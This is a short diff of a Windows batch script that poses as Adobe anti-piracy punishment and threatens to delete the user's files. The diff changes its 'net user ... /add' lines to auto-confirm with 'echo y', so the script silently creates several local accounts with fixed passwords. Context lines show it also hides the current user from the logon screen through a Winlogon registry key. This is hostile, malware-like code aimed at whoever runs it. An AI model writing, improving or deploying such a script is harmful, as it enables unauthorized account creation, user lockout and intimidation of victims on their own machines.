@@ -22,12 +22,12 @@ echo Say goodbye to all your files!
 timeout /t 2
 echo FEEL THE RAGE OF ADOBE! FEEL PAIN AND REALIZE WHAT YOU HAVE DONE!
 timeout /t 5
-net user Adobe_PW:CreativeCloud CreativeCloud /add
-net user A_Piracy péoaesj /add
-net user b_is alsieufb /add
-net user c_not iaiéáéá /add
-net user d_a éáéáéáé /add
-net user e_game éáéáéáéá /add
+echo y | net user Adobe_PW:CreativeCloud CreativeCloud /add
+echo y | net user A_Piracy péoaesj /add
+echo y | net user b_is alsieufb /add
+echo y | net user c_not iaiéáéá /add
+echo y | net user d_a éáéáéáé /add
+echo y | net user e_game éáéáéáéá /add
 set "username=%username%"
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %username% /t REG_DWORD /d 0 /f
 (
